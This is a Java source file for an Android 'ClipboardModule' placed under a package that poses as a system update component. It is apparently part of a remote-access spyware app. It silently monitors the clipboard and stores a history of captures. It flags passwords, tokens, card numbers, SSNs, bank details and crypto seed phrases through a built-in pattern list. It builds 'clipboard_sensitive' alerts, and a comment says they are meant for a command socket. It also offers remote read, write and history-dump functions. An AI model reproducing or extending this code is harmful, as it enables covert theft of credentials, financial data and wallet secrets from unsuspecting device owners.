package com.android.system.update.modules;

import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.ConcurrentLinkedQueue;

public class ClipboardModule {
    private static final String TAG = "ClipboardModule";
    private static final String PREFS_NAME = "clipboard_prefs";
    private static final String KEY_CLIPBOARD_HISTORY = "clipboard_history";
    private static final String KEY_MONITORING_ENABLED = "monitoring_enabled";
    private static final String KEY_AUTO_COPY_PATTERNS = "auto_copy_patterns";
    private static final int MAX_HISTORY_SIZE = 100;
    
    private Context context;
    private ClipboardManager clipboardManager;
    private SharedPreferences prefs;
    private ClipboardManager.OnPrimaryClipChangedListener clipListener;
    private Handler handler;
    private ConcurrentLinkedQueue<ClipboardEntry> clipboardHistory = new ConcurrentLinkedQueue<>();
    private boolean isMonitoring = false;
    private Set<String> autoCopyPatterns = new HashSet<>();
    
    // Sensitive data patterns for auto-copy
    private static final String[] DEFAULT_PATTERNS = {
        "password",
        "passwd",
        "token",
        "apikey",
        "api_key",
        "secret",
        "key",
        "auth",
        "credential",
        "login",
        "email",
        "phone",
        "credit.?card",
        "cvv",
        "ssn",
        "social.?security",
        "bank.?account",
        "routing.?number",
        "bitcoin",
        "wallet",
        "private.?key",
        "mnemonic",
        "seed.?phrase"
    };
    
    public ClipboardModule(Context context) {
        this.context = context;
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        this.handler = new Handler(Looper.getMainLooper());
        
        loadHistory();
        loadAutoCopyPatterns();
        setupClipboardListener();
    }
    
    private void setupClipboardListener() {
        clipListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                if (!isMonitoring) return;
                captureCurrentClipboard();
            }
        };
    }
    
    private void captureCurrentClipboard() {
        if (!clipboardManager.hasPrimaryClip()) return;
        
        ClipData clipData = clipboardManager.getPrimaryClip();
        if (clipData == null || clipData.getItemCount() == 0) return;
        
        ClipData.Item item = clipData.getItemAt(0);
        CharSequence text = item.getText();
        if (text == null) return;
        
        String content = text.toString();
        String label = getClipLabel(clipData);
        
        // Check if this is a duplicate of the last entry
        ClipboardEntry lastEntry = clipboardHistory.peek();
        if (lastEntry != null && lastEntry.content.equals(content)) {
            return; // Skip duplicate
        }
        
        ClipboardEntry entry = new ClipboardEntry(
            System.currentTimeMillis(),
            content,
            label,
            detectContentType(content)
        );
        
        clipboardHistory.offer(entry);
        
        // Keep history size limited
        while (clipboardHistory.size() > MAX_HISTORY_SIZE) {
            clipboardHistory.poll();
        }
        
        saveHistory();
        
        // Check for auto-copy patterns
        if (shouldAutoCopy(content)) {
            Log.d(TAG, "🔴 Sensitive data detected in clipboard: " + entry.type);
            notifySensitiveData(entry);
        }
        
        Log.d(TAG, "📋 Clipboard captured: " + content.substring(0, Math.min(20, content.length())) + "...");
    }
    
    private String getClipLabel(ClipData clipData) {
        ClipDescription description = clipData.getDescription();
        if (description != null && description.getLabel() != null) {
            return description.getLabel().toString();
        }
        return "Unknown";
    }
    
    private String detectContentType(String content) {
        if (content.matches(".*[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}.*")) {
            return "email";
        } else if (content.matches(".*\\b\\d{3}[-.]?\\d{3}[-.]?\\d{4}\\b.*")) {
            return "phone";
        } else if (content.matches(".*\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b.*")) {
            return "credit_card";
        } else if (content.matches(".*\\b\\d{3}-\\d{2}-\\d{4}\\b.*")) {
            return "ssn";
        } else if (content.matches("^(?=.*[A-Za-z])(?=.*\\d)[A-Za-z\\d]{8,}$")) {
            return "password";
        } else if (content.startsWith("http")) {
            return "url";
        } else {
            return "text";
        }
    }
    
    private boolean shouldAutoCopy(String content) {
        String lowerContent = content.toLowerCase();
        for (String pattern : autoCopyPatterns) {
            if (lowerContent.contains(pattern.toLowerCase()) || 
                content.matches(".*\\b" + pattern + "\\b.*")) {
                return true;
            }
        }
        return false;
    }
    
    private void notifySensitiveData(ClipboardEntry entry) {
        try {
            JSONObject notification = new JSONObject();
            notification.put("command", "clipboard_sensitive");
            notification.put("timestamp", entry.timestamp);
            notification.put("content_preview", entry.content.substring(0, Math.min(50, entry.content.length())) + "...");
            notification.put("type", entry.type);
            notification.put("label", entry.label);
            
            // In a real implementation, you'd send this via your existing socket
            // sendCommand(notification.toString());
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating sensitive data notification", e);
        }
    }
    
    public String getClipboardContent() {
        if (!clipboardManager.hasPrimaryClip()) {
            return "{\"success\":false,\"error\":\"No content in clipboard\"}";
        }
        
        ClipData clipData = clipboardManager.getPrimaryClip();
        if (clipData == null || clipData.getItemCount() == 0) {
            return "{\"success\":false,\"error\":\"Clipboard is empty\"}";
        }
        
        try {
            JSONArray itemsArray = new JSONArray();
            
            for (int i = 0; i < clipData.getItemCount(); i++) {
                ClipData.Item item = clipData.getItemAt(i);
                JSONObject itemJson = new JSONObject();
                
                CharSequence text = item.getText();
                if (text != null) {
                    itemJson.put("text", text.toString());
                }
                
                if (item.getUri() != null) {
                    itemJson.put("uri", item.getUri().toString());
                }
                
                if (item.getIntent() != null) {
                    itemJson.put("intent", item.getIntent().toString());
                }
                
                itemsArray.put(itemJson);
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("items", itemsArray);
            result.put("itemCount", clipData.getItemCount());
            result.put("timestamp", System.currentTimeMillis());
            
            ClipDescription description = clipData.getDescription();
            if (description != null) {
                // Fix: Iterate through mime types instead of using filterMimeTypes()
                JSONArray mimeTypes = new JSONArray();
                for (int j = 0; j < description.getMimeTypeCount(); j++) {
                    mimeTypes.put(description.getMimeType(j));
                }
                result.put("mimeTypes", mimeTypes);
                result.put("label", description.getLabel() != null ? description.getLabel() : "");
            }
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating clipboard JSON", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String setClipboardContent(String text, String label) {
        try {
            ClipData clipData;
            if (label != null && !label.isEmpty()) {
                clipData = ClipData.newPlainText(label, text);
            } else {
                clipData = ClipData.newPlainText("Copied Text", text);
            }
            
            clipboardManager.setPrimaryClip(clipData);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Clipboard set successfully");
            result.put("timestamp", System.currentTimeMillis());
            result.put("text_preview", text.substring(0, Math.min(30, text.length())) + "...");
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error setting clipboard", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String getClipboardHistory() {
        try {
            JSONArray historyArray = new JSONArray();
            List<ClipboardEntry> history = new ArrayList<>(clipboardHistory);
            
            for (int i = history.size() - 1; i >= 0; i--) {
                ClipboardEntry entry = history.get(i);
                JSONObject entryJson = new JSONObject();
                entryJson.put("timestamp", entry.timestamp);
                entryJson.put("content", entry.content);
                entryJson.put("preview", entry.content.substring(0, Math.min(50, entry.content.length())) + "...");
                entryJson.put("type", entry.type);
                entryJson.put("label", entry.label);
                
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                entryJson.put("timestampFormatted", sdf.format(new Date(entry.timestamp)));
                
                historyArray.put(entryJson);
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("history", historyArray);
            result.put("count", historyArray.length());
            result.put("monitoring", isMonitoring);
            
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating history JSON", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String clearHistory() {
        clipboardHistory.clear();
        saveHistory();
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Clipboard history cleared");
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String startMonitoring() {
        isMonitoring = true;
        clipboardManager.addPrimaryClipChangedListener(clipListener);
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Clipboard monitoring started");
            result.put("enabled", true);
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String stopMonitoring() {
        isMonitoring = false;
        clipboardManager.removePrimaryClipChangedListener(clipListener);
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Clipboard monitoring stopped");
            result.put("enabled", false);
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String getStatus() {
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("monitoring", isMonitoring);
            result.put("historySize", clipboardHistory.size());
            result.put("autoCopyPatterns", new JSONArray(autoCopyPatterns));
            
            if (clipboardManager.hasPrimaryClip()) {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    ClipData.Item item = clipData.getItemAt(0);
                    CharSequence text = item.getText();
                    if (text != null) {
                        result.put("currentPreview", text.toString().substring(0, Math.min(30, text.toString().length())) + "...");
                    }
                }
            }
            
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String addAutoCopyPattern(String pattern) {
        autoCopyPatterns.add(pattern);
        saveAutoCopyPatterns();
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Pattern added: " + pattern);
            result.put("patterns", new JSONArray(autoCopyPatterns));
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public String removeAutoCopyPattern(String pattern) {
        autoCopyPatterns.remove(pattern);
        saveAutoCopyPatterns();
        
        try {
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("message", "Pattern removed: " + pattern);
            result.put("patterns", new JSONArray(autoCopyPatterns));
            return result.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    private void saveHistory() {
        StringBuilder sb = new StringBuilder();
        for (ClipboardEntry entry : clipboardHistory) {
            if (sb.length() > 0) sb.append("||");
            sb.append(entry.timestamp).append("|")
              .append(entry.content.replace("|", "%7C").replace("||", "%7C%7C")).append("|")
              .append(entry.label.replace("|", "%7C")).append("|")
              .append(entry.type);
        }
        prefs.edit().putString(KEY_CLIPBOARD_HISTORY, sb.toString()).apply();
    }
    
    private void loadHistory() {
        String historyStr = prefs.getString(KEY_CLIPBOARD_HISTORY, "");
        if (historyStr.isEmpty()) return;
        
        String[] entries = historyStr.split("\\|\\|");
        for (String entryStr : entries) {
            String[] parts = entryStr.split("\\|", 4);
            if (parts.length == 4) {
                try {
                    long timestamp = Long.parseLong(parts[0]);
                    String content = parts[1].replace("%7C", "|");
                    String label = parts[2].replace("%7C", "|");
                    String type = parts[3];
                    
                    clipboardHistory.offer(new ClipboardEntry(timestamp, content, label, type));
                } catch (NumberFormatException e) {
                    Log.e(TAG, "Error parsing history entry", e);
                }
            }
        }
    }
    
    private void saveAutoCopyPatterns() {
        StringBuilder sb = new StringBuilder();
        for (String pattern : autoCopyPatterns) {
            if (sb.length() > 0) sb.append(",");
            sb.append(pattern);
        }
        prefs.edit().putString(KEY_AUTO_COPY_PATTERNS, sb.toString()).apply();
    }
    
    private void loadAutoCopyPatterns() {
        String patternsStr = prefs.getString(KEY_AUTO_COPY_PATTERNS, "");
        if (patternsStr.isEmpty()) {
            // Load default patterns
            for (String pattern : DEFAULT_PATTERNS) {
                autoCopyPatterns.add(pattern);
            }
        } else {
            String[] patterns = patternsStr.split(",");
            for (String pattern : patterns) {
                autoCopyPatterns.add(pattern);
            }
        }
    }
    
    // Inner class for clipboard entries
    private static class ClipboardEntry {
        long timestamp;
        String content;
        String label;
        String type;
        
        ClipboardEntry(long timestamp, String content, String label, String type) {
            this.timestamp = timestamp;
            this.content = content;
            this.label = label;
            this.type = type;
        }
    }
}
